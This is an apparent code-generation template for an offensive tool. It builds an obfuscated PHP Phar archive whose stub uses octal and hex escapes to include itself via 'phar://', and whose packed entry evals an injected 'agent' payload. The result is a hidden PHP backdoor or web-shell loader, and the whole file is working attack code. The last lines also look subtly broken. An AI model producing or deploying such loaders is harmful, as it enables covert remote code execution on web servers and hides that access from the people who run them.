<%!
import io
import zlib
import hashlib
from datetime import datetime
%><%
agent = agent.strip(b'\n')
stub = b"""<?php include "\\160\\x68\\141\\x72\\72\\57\\57".basename(__FILE__)."\\57\\x78";__HALT_COMPILER(); ?>"""
fname = b'x'
f = b'<?php eval(\''+agent+b'\');'
fenc = zlib.compress(f)[2:-4]
flags = 0x00010000

output = io.BytesIO()

output.write(stub)

# Manifest
manifest_len_cursor = output.tell()
output.write(b'\0\0\0\0') # Placeholder for manifest length
output.write((1).to_bytes(4, 'little'))
output.write(b'\x11\x00') # Phar version
output.write((flags).to_bytes(4, 'little'))
alias_bytes = b''
output.write(len(alias_bytes).to_bytes(4, 'little'))
output.write(alias_bytes)
output.write((0).to_bytes(4, 'little'))

# Entry manifest
output.write(len(fname).to_bytes(4, 'little'))
output.write(fname)
output.write(len(f).to_bytes(4, 'little'))
output.write(int(datetime.now().timestamp()).to_bytes(4, 'little'))
output.write(len(fenc).to_bytes(4, 'little'))
output.write(zlib.crc32(f).to_bytes(4, 'little'))
output.write((0o777 | 0x00001000).to_bytes(4, 'little'))
output.write((0).to_bytes(4, 'little'))

# Fix manifest length
manifest_len = output.tell() - manifest_len_cursor - 4
s, t = manifest_len_cursor, manifest_len_cursor + 4
output.getbuffer()[s:t] = manifest_len.to_bytes(4, 'little')

# Content
output.write(fenc)
output.write(hashlib.sha1(output.getvalue()).digest())
output.write((0x0002).to_bytes(4, 'little'))
output.write(b'GBMB').decode('utf-8', 'replace')
%>${output.encode('utf-8')}